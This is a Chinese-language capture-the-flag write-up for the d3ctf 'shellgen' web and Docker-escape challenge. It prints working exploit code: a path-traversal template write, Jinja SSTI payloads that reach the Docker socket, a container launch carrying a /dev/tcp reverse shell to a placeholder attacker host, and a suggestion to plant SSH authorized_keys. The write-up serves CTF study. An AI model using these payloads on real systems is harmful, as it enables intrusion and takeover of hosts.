# shellgen

## 题目简述

本题是 Web + Docker 逃逸题。应用允许提交 Python 脚本到容器中执行，并把 `token` 拼接进目录名后挂载；同时 `/result` 使用 Jinja 模板渲染执行结果。通过把 `token` 控制为 `../templates/<subdir>`，可以把模板目录挂进脚本容器并写入 `result.html`，再用另一个 session 触发模板渲染形成 SSTI。

题目附件是一个 Web 版 shell 生成器，服务端把用户提交内容写入模板相关路径，后端运行在 rootless Docker 环境中。后续利用链是通过 Jinja 访问 Python 内置能力连接 Docker socket，识别 rootless Docker 后改用 `/var/run/user/1000/docker.sock`，最终控制宿主机用户权限并分析 `FROM scratch` 的 flag 容器。

## 解题过程

题目源码见 [`frankli0324/d3ctf-shellgen` 的 web 部分](https://github.com/frankli0324/d3ctf-shellgen/tree/master/web)。下文保留了源码中的 token 挂载路径、队列执行、模板渲染和 Docker rootless 利用条件。

访问应用后可以看到部分源码。服务在运行用户提交的 Python 脚本时，会把 `token` 拼接进目录名，并把该目录挂载进执行脚本的容器。结合 `/result` 的模板目录结构，可以把 `token` 设为 `../templates/<subdir>`，让脚本容器写入 Flask/Jinja 模板目录中的 `result.html`：

```python
subdir = "qwq"
pld.post(host + "/submit", data={
    "token": "../templates/" + subdir,
    "code": f"""
import os
with open('/opt/result.html', 'w') as f:
    f.write({payload!r})
""".strip(),
})

for _ in range(10):
    res = pld.get(host + "/result").text
    if res:
        break
    time.sleep(1)
```

直接用同一个 session 访问 `/result` 会遇到 `TemplateNotFound`。原因是 Jinja `FileSystemLoader` 的 `split_template_path()` 会拒绝模板路径中包含 `..`：

```python
def split_template_path(template):
    """Split a path into segments and perform a sanity check.
    If it detects '..' in the path it will raise TemplateNotFound.
    """
```

因此需要用第一个 session 写模板，再用另一个 session 把 `token` 设置成正常的 `<subdir>`，触发刚写入的 `result.html` 渲染：

```python
subdir = "qwq"
pld.post(host + "/submit", data={
    "token": "../templates/" + subdir,
    "code": f"""
import os
with open('/opt/result.html', 'w') as f:
    f.write({payload!r})
""".strip(),
})

ses = session()
ses.post(host + "/submit", data={"token": subdir, "code": ""})

for _ in range(10):
    res = ses.get(host + "/result").text
    if res:
        break
    time.sleep(1)
```

队列调度逻辑也支持这一点：后台每 10 秒只取一个任务执行，先提交的写模板任务会先于后提交的空任务运行；题目环境中空代码只设置 `session["token"]`，不会再加入新的执行任务。由于 Jinja 有缓存，需要不断更换 `subdir`。

拿到 SSTI 后，先用 Jinja 访问 Python 内置能力，连 Unix socket 写一个 Docker API 小代理。完整代理脚本链接保留在 <https://gist.github.com/frankli0324/70d4b1e200a6d90ec6f97dfb87110537#file-proxy-py>；本题需要理解的核心是：模板里导入 `socket`，连接 Docker 的 Unix socket，发送原始 HTTP 请求，再把响应读回页面。模板核心如下：

```jinja
{% set socket = request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__("socket") %}
{% set s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) %}
{% set n = s.connect("/var/run/docker.sock") %}
{% set n = s.sendall(request_bytes) %}
{{ s.recv(81920) }}
```

Docker API 本质是基于 HTTP 的无状态 API，因此通过代理可以完成 `docker info` 这类基础请求。但 `docker run` 等命令需要升级为双向连接，单纯代理不够方便。可以改用 Python Docker SDK，在新容器中挂载 `docker.sock` 和 `docker` CLI，尝试拿宿主机交互 shell：

```jinja
{% set docker = request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__("docker") %}
{% set client = docker.DockerClient() %}
{{ client.containers.run(
    "ubuntu",
    "bash -c 'exec bash -i &>/dev/tcp/<attacker-ip>/<attacker-port> <&1'",
    mounts=[
        docker.types.Mount(type="bind", source="/var/run/docker.sock", target="/var/run/docker.sock"),
        docker.types.Mount(type="bind", source="/usr/bin/docker", target="/usr/bin/docker")
    ]
) }}
```

如果这里出现 `permission denied`，就要先看 `docker info`：

```text
Server:
  Server Version: 20.10.5
  Security Options:
    seccomp
    rootless
  Docker Root Dir: /home/d3ctf/.local/share/docker
```

题目使用 Docker rootless 模式。官方文档 <https://docs.docker.com/engine/security/rootless/> 的关键点是：daemon 不是 root 启动，socket 通常不在传统的 `/var/run/docker.sock`，而在用户运行时目录下，例如 `/var/run/user/1000/docker.sock`。控制该 socket 获得的是宿主机普通用户 `d3ctf` 的 Docker 权限；rootlesskit 会用 namespace 把宿主机普通用户权限映射成容器内 root，因此传统 root dockerd 下的 `--privileged --pid=host --volume /:/host` chroot 逃逸不能直接照搬。

修正方向是把 `/var/run/docker.sock` 改成 `/var/run/user/1000/docker.sock` 再挂进容器，随后以 `d3ctf` 用户权限拿宿主机 shell。可行方式包括写入 `/home/d3ctf/.ssh/authorized_keys` 后 SSH 登录，或者直接把运行 flag 的容器镜像导出分析。

flag 容器由 `FROM scratch` 构建，镜像内没有 shell 命令，需要按镜像文件本身分析：

```dockerfile
FROM gcc AS builder

COPY getflag.cpp getflag.cpp
COPY sleep.cpp sleep.cpp
RUN g++ getflag.cpp -o getflag -static
RUN g++ sleep.cpp -o sleep -static

FROM scratch
COPY --from=builder getflag /getflag
COPY --from=builder sleep /sleep
CMD ["/sleep"]
```

因此即使拿到宿主机用户权限，也不能默认 `docker exec sh`，而要导出镜像或直接运行静态二进制来取 flag。

## 方法总结

- 核心技巧：目录穿越写模板 + Jinja SSTI + Docker socket 利用，并进一步区分 rootless Docker 与 root dockerd 的逃逸差异。
- 识别信号：用户可控 token 参与挂载路径、结果页由模板渲染、队列任务按固定间隔执行、容器内可访问 Docker socket。
- 复用要点：拿到 docker.sock 后先看 `docker info`，确认是否 rootless、Docker Root Dir 和 namespace 映射；rootless 场景不能照搬 privileged/chroot 宿主机的传统逃逸方式。

